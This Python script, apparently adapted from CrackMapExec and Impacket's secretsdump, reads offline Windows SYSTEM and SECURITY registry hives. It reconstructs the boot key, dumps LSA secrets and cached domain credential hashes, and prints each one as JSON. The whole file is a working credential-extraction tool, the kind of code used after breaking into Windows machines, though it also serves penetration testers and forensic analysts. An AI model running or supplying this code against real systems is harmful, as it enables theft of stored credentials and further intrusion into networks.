import sys
from impacket.examples.secretsdump import LocalOperations, LSASecrets
from impacket import winregistry
from binascii import hexlify, unhexlify
from six import b
import json

def main(sysF, secF):

    bootkey = getBootKey(sysF)

    #Borrowed Code from https://github.com/byt3bl33d3r/CrackMapExec/blob/48fd338d228f6589928d5e7922df4c7cd240a287/cme/protocols/smb.py#L848
    #Changed to save LSA Secrets and cached creds to JSON format
    def add_lsa_secret(secret):
        add_lsa_secret.secrets += 1
        lsaName, lsaHash = secret.split(':', 1)
        secdict = {"LSAName": lsaName, "LSAHash": lsaHash}
        jsonFormat = json.dumps(secdict)
        print(jsonFormat)
    add_lsa_secret.secrets = 0

    LSA = LSASecrets(secF, bootkey, remoteOps=None, isRemote=False, perSecretCallback=lambda secretType, secret: add_lsa_secret(secret))

    LSA.dumpCachedHashes()
    LSA.dumpSecrets()

# From Impacket https://github.com/SecureAuthCorp/impacket/blob/69fee03fd8c120ec7ed0b1e630f7dcc5780fa3f9/impacket/examples/secretsdump.py#L735
def getBootKey(system):
        # Local Version whenever we are given the files directly
        bootKey = b''
        tmpKey = b''
        winreg = winregistry.Registry(system, False)
        # We gotta find out the Current Control Set
        currentControlSet = winreg.getValue('\\Select\\Current')[1]
        currentControlSet = "ControlSet%03d" % currentControlSet
        for key in ['JD', 'Skew1', 'GBG', 'Data']:
            ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
            digit = ans[:16].decode('utf-16le')
            tmpKey = tmpKey + b(digit)

        transforms = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]

        tmpKey = unhexlify(tmpKey)

        for i in range(len(tmpKey)):
            bootKey += tmpKey[transforms[i]:transforms[i] + 1]

        return bootKey


if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])